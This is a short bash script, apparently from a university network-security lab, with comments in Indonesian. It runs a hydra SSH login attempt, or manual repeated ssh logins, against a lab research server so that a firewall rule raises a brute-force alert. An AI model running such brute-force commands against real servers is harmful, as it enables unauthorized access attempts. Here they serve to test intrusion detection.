#! /bin/bash

# EXPLOITATION (SSH Brute Force)
# Node Attacker: PC Mahasiswa
# Node Target: Server Riset (10.20.30.10)

# di pc riset
service ssh start

# di pc mahasiswa
# Jika ada Hydra:
hydra -l root -p salah123 -t 6 ssh://10.20.30.10
# MANUAL (Jika tidak ada Hydra):
# Lakukan ssh manual, tekan Ctrl+C, ulangi cepat 6 kali.
ssh root@10.20.30.10
^C
ssh root@10.20.30.10
^C
# ... (ulangi sampai 6x dengan cepat)

# Hasil yang Diharapkan (Di Log Firewall):
[**] [1:20002:1] [KRITIS] Indikasi SSH Brute Force ke Server Riset [**] ...